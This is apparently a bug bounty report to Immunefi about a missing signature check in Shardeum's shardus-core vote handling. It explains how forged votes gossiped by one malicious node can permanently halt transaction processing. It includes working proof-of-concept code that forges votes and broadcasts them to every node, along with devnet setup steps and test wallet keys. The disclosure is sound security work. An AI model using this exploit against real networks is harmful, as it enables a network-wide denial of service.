# 34422 - \[BC - High] Forcing the new POQo system to fail preventing ...

Submitted on Aug 12th 2024 at 13:06:32 UTC by @infosec\_us\_team for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #34422

Report type: Blockchain/DLT

Report severity: High

Target: <https://github.com/shardeum/shardus-core/tree/dev>

Impacts:

* Network not being able to confirm new transactions (total network shutdown)

## Description

## Intro

* Nodes create a hash from data about a user transaction.
* Every node distributes its hash to the rest of the execution group and votes for it.
* There are checks in place that prevent the same node from voting multiple times for the same transaction.
* A consensus system selects wherever hash has two-thirds of the votes as the winner, then validates the signature of the votes to make sure they are legit.
* Using the binary gossip route `binary_spread_appliedVoteHash`, the system allows a node **X** to gossip to the rest of the network a vote to a transaction "supposedly" signed by another node **Y**.

Votes have the following format:

```
let appliedVoteHash = {
    txid: "id of the transaction",
    voteHash: "hash of an object with details about the TX",
    sign: {
        owner: "public key of the node voting",
        sig: "signature to verify the integrity of the hash"
    }
}
```

If a malicious node **X** gossips to the rest of the network a fake `appliedVoteHash` with the public key of the node **Y**, a fake and invalid signature, and a fake voteHash, the real node **Y** won't be able to vote for the correct voteHash later because the network's protection from double-voting will see his message as a second attempt to vote for the same transaction and ignore his request.

```
 ┌──────┐                ┌──────┐┌──────┐┌──────┐        ┌──────┐
 │Node X│                │Node Z││Node W││Node V│        │Node Y│
 └──┬───┘                └──┬───┘└──┬───┘└──┬───┘        └──┬───┘
    │                       │       │       │               │    
    │Vote from "Node Y" (OK)│       │       │               │    
    │──────────────────────>│       │       │               │    
    │                       │       │       │               │    
    │    Vote from "Node Y" (OK)    │       │               │    
    │──────────────────────────────>│       │               │    
    │                       │       │       │               │    
    │        Vote from "Node Y" (OK)│       │               │    
    │──────────────────────────────────────>│               │    
    │                       │       │       │               │    
    │                       │       │My Vote (ERROR)        │    
    │                       │<──────────────────────────────│    
    │                       │       │       │               │    
    │                       │       │    My Vote (ERROR)    │    
    │                       │       │<──────────────────────│    
    │                       │       │       │               │    
    │                       │       │       │My Vote (ERROR)│    
    │                       │       │       │<──────────────│    
 ┌──┴───┐                ┌──┴───┐┌──┴───┐┌──┴───┐        ┌──┴───┐
 │Node X│                │Node Z││Node W││Node V│        │Node Y│
 └──────┘                └──────┘└──────┘└──────┘        └──────┘

```

The vulnerability exists in the function `tryAppendVoteHash(...)` which appends votes sent by any node via the gossip route `binary_spread_appliedVoteHash`, without validating the signature attached to the object (*`appliedVoteHash`*)

Validating the signature would prevent a malicious node **X** from distributing fake and invalid votes.

## Brief about the attack vector

As soon as a transaction is received, a malicious node spreads to every single node in the network a fake and invalid vote from every node in the execution group.

As a result, when the nodes from the execution group attempt to gossip their votes, their request counts as voting twice for the same TX and is ignored.

At this point, the winner hash - *the one with two-thirds of votes or more, which in the case of this attack will be a random and invalid hash distributed by a malicious node* - is full of invalid signatures.

The network now enters a state where there are 2 hashes for the transaction:

**Hash #1-** The hash of a malicious object with only 1 vote (only the malicious node has voted for it) and the signature for that hash is valid.

**Hash #2-** An invalid hash, with a majority of votes ( "all nodes voted for it" ) but the signatures that verify their vote are invalid, which means they didn't sign that vote.

A chain of problems begins: the `verifyAppliedReceipt(...)` always returns false, which prevents the gossip route for the POQo `poqo-receipt-gossip` from succeeding, `generateReceiptMapResults` complains about an entry in with no receipt in *newAcceptedTxQueue*, etc.

When reproducing the attack in a running chain, the network stops processing new transactions after the malicious node bricks the consensus system, and it **stays bricked** (unable to process transactions) **even after the malicious node leaves the active set, is kicked out of the network or shuts down himself**.

## Vulnerability

Below is the `tryAppendVoteHash(...)` function as a reference:

```
  tryAppendVoteHash(queueEntry: QueueEntry, voteHash: AppliedVoteHash): boolean {
    // Check if sender is in execution group
    if (!queueEntry.executionGroup.some((node) => node.publicKey === voteHash.sign.owner)) {
      nestedCountersInstance.countEvent('poqo', 'Vote sender not in execution group')
      return false
    }

    const numVotes = queueEntry.collectedVoteHashes.length

    /* prettier-ignore */ if (logFlags.playback) this.logger.playbackLogNote('tryAppendVoteHash', `${queueEntry.logID}`, `collectedVotes: ${queueEntry.collectedVoteHashes.length}`)
    /* prettier-ignore */ if (logFlags.debug) this.mainLogger.debug(`tryAppendVoteHash collectedVotes: ${queueEntry.logID}   ${queueEntry.collectedVoteHashes.length} `)

    // just add the vote if we dont have any yet
    if (numVotes === 0) {
      queueEntry.collectedVoteHashes.push(voteHash)
      queueEntry.newVotes = true
      queueEntry.lastVoteReceivedTimestamp = shardusGetTime()
      return true
    }

    //compare to existing votes.  keep going until we find that this vote is already in the list or our id is at the right spot to insert sorted
    for (let i = 0; i < numVotes; i++) {
      // eslint-disable-next-line security/detect-object-injection
      const currentVote = queueEntry.collectedVoteHashes[i]

      if (currentVote.sign.owner === voteHash.sign.owner) {
        // already in our list so do nothing and return
        return false
      }
    }

    queueEntry.collectedVoteHashes.push(voteHash)
    queueEntry.newVotes = true
    queueEntry.lastVoteReceivedTimestamp = shardusGetTime()
    return true
  }
```

> Code snippet from <https://github.com/shardeum/shardus-core/blob/dev/src/state-manager/TransactionConsensus.ts#L4127-L4164>

Without validating the signature of the `AppliedVoteHash`, it adds the hash to the `collectedVoteHashes` list and prevents the same node from voting again, resulting in fake votes banning legit nodes.

## Impact Details

Network not being able to confirm new transactions.

The first one is accepted, then a malicious node bricks the new POQo consensus logic and prevents new transactions from being processed **even if the malicious node is kicked out of the network or shuts down himself**.

## Proof of concept

For the reader's convenience, our team has created 2 POCs instead of just 1:

#### POC 1- Code to exploit the network

The code for a complete end-to-end proof of concept that starts the Shardeum network, sends a transaction as a user, then bricks the network and prevents it from processing new transactions.

#### POC 2- A video running transactions in the network without a malicious node and then with the malicious node bricking the POQo

The *40 minute* video is divided into 2 parts:

* The first 18 minutes demonstrate the expected behavior by running a Shardeum network and sending a few transactions as 2 different users from different wallets, and they all succeed.
* In the rest of the video, we add the code that allows 1 malicious node to gossip fake votes in mass to every node as soon as possible, start the Shardeum network, send a few transactions as 2 different users from different wallets, and demonstrate how only the very 1st transaction succeeds.

Link to download the video from Google Drive: <https://drive.google.com/file/d/1awpEFJAsChe2qROnbBvwBsgmKg4WmBDP/view?usp=share\\_link>

From **0:00** to **1:20** - Starting an unmodified Shardeum network with 30 nodes in total, 10 active, and 2 wallet accounts funded with balance to test user transactions.

From **1:20** to **17:10** - Wait until cycle 15, so the first selected group of nodes finishes syncing and becomes active.

From **17:10** to **18:29** - Start the JSON RPC provider, and submit multiple balance transfers from 2 different user wallets. They all succeed.

From **18:29** to **20:05** - Stop the server. Add the code snippet that allows the node running at port **9002** to gossip fake and invalid votes to the rest of the network. Build the codebase again. Start the Shardeum network with 30 nodes in total, 10 active, and 2 wallet accounts funded with balance to test user transactions.

From **20:05** to **35:59** - Wait until cycle 15, so the first selected group of nodes finishes syncing and becomes active.

From **35:59** to **37:23** - Start the RPC server, and submit multiple balance transfers from 2 different user wallets. Only the 1st TX succeeds and returns a transaction ID.

From **37:23** to **40:03** - We manually stopped the malicious node running at port **9002**, restarted the JSON RPC provider, and tried sending new transactions again, but they are still not getting processed.

## Setting up the Proof of Concept

> Instructions assume the use of the CLI and a terminal-based editor

Clone locally the most recent version of the Shardus Core and Shardeum repositories (*at the time of submitting this report*).

Apply to Shardeum the network configuration used for testing local networks of 10 active nodes by running:

```
git apply debug-10-nodes.patch
```

Point Shardeum to use the local repo of Shardus Core in the file ./package-lock.json

```
    "@shardus/core": "../shardus-core",
```

Inside Shardeum, go to `./src/config/genesis.json` and add these 2 wallets with some funds to test transfers:

```
  "0x9188b89DFB2A924CcE215200C1E8974545Da7605": {
    "wei": "999999999999999999999999999"
  },
  "0xA7A8A1042042A3726d15f5966d1f8c4DB8f2d8Ab": {
    "wei": "999999999999999999999999999"
  },
```

> Their private keys are:
>
> Address: 0x9188b89DFB2A924CcE215200C1E8974545Da7605
>
> PrivateKey: ecc743bb70908335fbd9cf06e2bfdf95b23607e3d550d70954b2b86be9a661f6
>
> Address: 0xA7A8A1042042A3726d15f5966d1f8c4DB8f2d8Ab
>
> PrivateKey: b92d798c878bdc6aec617419e65f43653ef5ba920e07184bfd15ed1e819209c3

Go to the `tryAppendVoteHash` function at <https://github.com/shardeum/shardus-core/blob/dev/src/state-manager/TransactionConsensus.ts#L4127> and add the following code at the very first line of the function:

```
    try {
      // If we are malicious node (9002)
      if (Self.getThisNodeInfo().externalPort == 9002) {
        console.log(`INFOSEC: VOTING ATTACK`)

        // Vote for all nodes using a broken hash and signature
        for (let i = 0; i < NodeList.byIdOrder.length; i++) {
          let appliedVoteHash = {
            txid: voteHash.txid,
            voteHash: "evilHash",
            sign: {
              owner: NodeList.byIdOrder[i].publicKey,
              sig: "evil sig"
            }
          }
          if (NodeList.byIdOrder[i].externalPort != 9002) {
            const request = appliedVoteHash as AppliedVoteHash
            // Gossip broken values
            this.p2p.tellBinary<SpreadAppliedVoteHashReq>(
              NodeList.byIdOrder,
              InternalRouteEnum.binary_spread_appliedVoteHash,
              request,
              serializeSpreadAppliedVoteHashReq,
              {}
            )
          }
          // Update our own votes with the broken values
          queueEntry.collectedVoteHashes.push(appliedVoteHash)
          queueEntry.newVotes = true
          queueEntry.lastVoteReceivedTimestamp = shardusGetTime()
        }
        return true
      }
    } catch (e) {
      console.log(`INFOSEC: tryAppendVoteHash failed: ${e.message} |||| ${e.stack}`)
    }
```

The final function should look like this:

```
  tryAppendVoteHash(queueEntry: QueueEntry, voteHash: AppliedVoteHash): boolean {

    try {
      // If we are malicious node (9002)
      if (Self.getThisNodeInfo().externalPort == 9002) {
        console.log(`INFOSEC: VOTING ATTACK`)

        // Vote for all nodes using a broken hash and signature
        for (let i = 0; i < NodeList.byIdOrder.length; i++) {
          let appliedVoteHash = {
            txid: voteHash.txid,
            voteHash: "evilHash",
            sign: {
              owner: NodeList.byIdOrder[i].publicKey,
              sig: "evil sig"
            }
          }
          if (NodeList.byIdOrder[i].externalPort != 9002) {
            const request = appliedVoteHash as AppliedVoteHash
            // Gossip broken values
            this.p2p.tellBinary<SpreadAppliedVoteHashReq>(
              NodeList.byIdOrder,
              InternalRouteEnum.binary_spread_appliedVoteHash,
              request,
              serializeSpreadAppliedVoteHashReq,
              {}
            )
          }
          // Update our own votes with the broken values
          queueEntry.collectedVoteHashes.push(appliedVoteHash)
          queueEntry.newVotes = true
          queueEntry.lastVoteReceivedTimestamp = shardusGetTime()
        }
        return true
      }
    } catch (e) {
      console.log(`INFOSEC: tryAppendVoteHash failed: ${e.message} |||| ${e.stack}`)
    }
    // Check if sender is in execution group
    if (!queueEntry.executionGroup.some((node) => node.publicKey === voteHash.sign.owner)) {
      nestedCountersInstance.countEvent('poqo', 'Vote sender not in execution group')
      return false
    }

    const numVotes = queueEntry.collectedVoteHashes.length

    /* prettier-ignore */ if (logFlags.playback) this.logger.playbackLogNote('tryAppendVoteHash', `${queueEntry.logID}`, `collectedVotes: ${queueEntry.collectedVoteHashes.length}`)
    /* prettier-ignore */ if (logFlags.debug) this.mainLogger.debug(`tryAppendVoteHash collectedVotes: ${queueEntry.logID}   ${queueEntry.collectedVoteHashes.length} `)

    // just add the vote if we dont have any yet
    if (numVotes === 0) {
      queueEntry.collectedVoteHashes.push(voteHash)
      queueEntry.newVotes = true
      queueEntry.lastVoteReceivedTimestamp = shardusGetTime()
      return true
    }

    //compare to existing votes.  keep going until we find that this vote is already in the list or our id is at the right spot to insert sorted
    for (let i = 0; i < numVotes; i++) {
      // eslint-disable-next-line security/detect-object-injection
      const currentVote = queueEntry.collectedVoteHashes[i]

      if (currentVote.sign.owner === voteHash.sign.owner) {
        // already in our list so do nothing and return
        return false
      }
    }

    queueEntry.collectedVoteHashes.push(voteHash)
    queueEntry.newVotes = true
    queueEntry.lastVoteReceivedTimestamp = shardusGetTime()
    return true
  }
```

The injected code will only run for the node at port 9002, which is going to be a malicious node with a custom Shardus Core. The rest of the nodes skip it.

## Running the Proof of Concept

Build both codebases and start the network with 30 nodes using shardus's CLI command: `shardus start 30`

* Using the network monitor at <http://SERVER\\_IP:3000>, wait until cycle 15.
* Run a JSON RPC Server to interact with the Shardeum blockchain network as a user.

We are using the one created by Shardeum team: <https://github.com/shardeum/json-rpc-server>

* Send a transaction from one of the 2 accounts we added to genesis.

We use the following script created by Shardeum <https://github.com/shardeum/simple-network-test/blob/dev/tx.js> - is a very simple script to test sending a TX, you can download the repo and use it as in our video or manually interact with the JSON RPC Server.

Using the Simple Network Test repo, you can transfer funds from one of the accounts using:

```
node tx.js --no_tx 1 --rpc http://127.0.0.1:8080/ --privateKey ecc743bb70908335fbd9cf06e2bfdf95b23607e3d550d70954b2b86be9a661f6 --amount 30
```

For the second account use:

```
node tx.js --no_tx 1 --rpc http://127.0.0.1:8080/ --privateKey b92d798c878bdc6aec617419e65f43653ef5ba920e07184bfd15ed1e819209c3 --amount 40
```

**The blockchain becomes vulnerable as soon as the malicious node (running at port 9002) becomes active**.

If the node running at port 9002 is not part of the active set, transfers will succeed and return a transaction ID.

If you attempt to transfer funds while the malicious node is active, only the very 1st transaction will succeed, the rest won't.

Even after completely shutting down the malicious node by visiting <http://SERVER\\_IP:9002/stop> and a new set of validators becomes active, transactions are still not being processed succesfully.
